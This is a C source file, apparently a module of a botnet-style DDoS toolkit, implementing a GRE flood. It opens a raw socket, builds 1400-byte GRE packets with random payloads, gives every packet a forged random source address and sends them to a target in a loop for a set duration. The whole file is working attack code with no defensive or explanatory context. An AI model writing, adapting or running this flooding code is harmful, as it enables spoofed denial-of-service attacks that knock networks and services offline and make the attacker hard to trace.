#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <netinet/ip.h>

#include "gre_attack.h"
#include "../headers/protocol.h"
#include "../headers/checksum.h"

struct gre_header {
    uint16_t flags;
    uint16_t protocol;
};

#define GRE_PAYLOAD 1400

void* gre_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return NULL;
    }

    int sndbuf = 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    attack_option* opt_proto = find_option(params, OPT_PROTO);
    uint16_t gre_proto = opt_proto ? get_option_u16(opt_proto) : 0x0800; // ETH_P_IP

    size_t pkt_size = sizeof(struct iphdr) + sizeof(struct gre_header) + GRE_PAYLOAD;
    char *packet = malloc(pkt_size);
    if (!packet) { close(fd); return NULL; }
    memset(packet, 0, pkt_size);

    struct iphdr*      ip  = (struct iphdr*)packet;
    struct gre_header* gre = (struct gre_header*)(packet + sizeof(struct iphdr));
    char*              dat = packet + sizeof(struct iphdr) + sizeof(struct gre_header);

    ip->version  = 4;
    ip->ihl      = 5;
    ip->tos      = 0;
    ip->tot_len  = htons(pkt_size);
    ip->frag_off = 0;
    ip->ttl      = 255;
    ip->protocol = 47; // GRE
    ip->saddr    = INADDR_ANY;
    ip->daddr    = params->target_addr.sin_addr.s_addr;

    gre->flags    = htons(0x0000);
    gre->protocol = htons(gre_proto);

    // random payload once
    for (int i = 0; i < GRE_PAYLOAD; i++) dat[i] = rand() & 0xFF;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    while (params->active) {
        ip->id    = htons(rand() & 0xFFFF);
        ip->saddr = rand(); // spoof
        ip->check = 0;
        ip->check = generic_checksum(ip, sizeof(struct iphdr));

        sendto(fd, packet, pkt_size, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));

        if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
    }

    free(packet);
    close(fd);
    return NULL;
}
